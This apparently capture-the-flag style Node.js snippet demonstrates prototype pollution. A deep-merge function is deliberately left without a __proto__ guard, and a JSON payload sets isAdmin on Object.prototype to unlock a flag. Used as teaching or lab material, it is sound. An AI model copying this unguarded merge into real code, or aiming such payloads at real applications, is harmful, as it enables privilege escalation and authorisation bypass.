// Prototype pollution in a vulnerable deep-merge (Node.js).
function merge(target, source){
  for (let key in source){
    if (typeof source[key] === 'object' && source[key] !== null){
      if (typeof target[key] !== 'object' || target[key] === null) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];   // VULN: no __proto__ guard
    }
  }
  return target;
}
const config = {};
// Attacker-controlled JSON:
const evil = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge(config, evil);
console.log("isAdmin:", config.isAdmin);  // true via pollution
if (config.isAdmin) console.log("FLAG: " + (process.env.CTF_FLAG || "[SET_CTF_FLAG_TO_SOLVE]"));
